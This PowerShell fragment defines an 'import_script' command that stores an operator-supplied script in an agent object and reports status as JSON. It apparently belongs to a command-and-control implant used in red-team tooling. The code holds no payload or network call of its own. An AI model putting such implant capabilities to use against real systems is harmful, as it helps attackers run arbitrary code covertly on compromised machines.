function global:import_script {
    param($Job)
    try {
        $data = $Job.parameters | ConvertFrom-Json
        if ($data.script -ne "") {
            $Agent.Script = $data.script
            return [pscustomobject]@{
                completed = $true
                user_output = "Script successfully loaded and available to all commands"
            } | ConvertTo-Json -Depth 4 -Compress
        }
        else {
            return [pscustomobject]@{
                completed = $true
                user_output = "Script was empty, couldn't be loaded"
                status = "error"
            } | ConvertTo-Json -Depth 4 -Compress
        }
    }
    catch {
        return [pscustomobject]@{
            completed = $true
            user_output = $error[0] | Out-String
            status = "error"
        } | ConvertTo-Json -Depth 4 -Compress
    }
}
$Script:Management_Commands['import_script'] = 'import_script'
